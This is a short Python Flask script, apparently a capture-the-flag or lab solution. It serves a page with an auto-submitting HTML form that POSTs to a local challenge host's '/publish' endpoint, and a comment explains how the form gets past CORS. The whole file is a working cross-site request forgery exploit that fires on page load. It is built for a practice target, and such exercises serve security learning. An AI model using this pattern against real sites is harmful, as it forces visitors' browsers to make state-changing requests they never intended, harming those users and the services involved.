from flask import Flask
import requests
# Strategy: HTML predates JS (and its security features), so an HTML form
# making a post request would not violate any CORS restrictions
app = Flask(__name__)

@app.route("/")
def respond():
    url = "http://challenge.localhost:80/publish"
    form_html = f"""
    <form id="payload" method="post" action="{url}">
        <input type="submit">
    </form>
    <script>document.getElementById('payload').submit()</script>
    """
    return form_html

app.run(debug=True, port=1337)
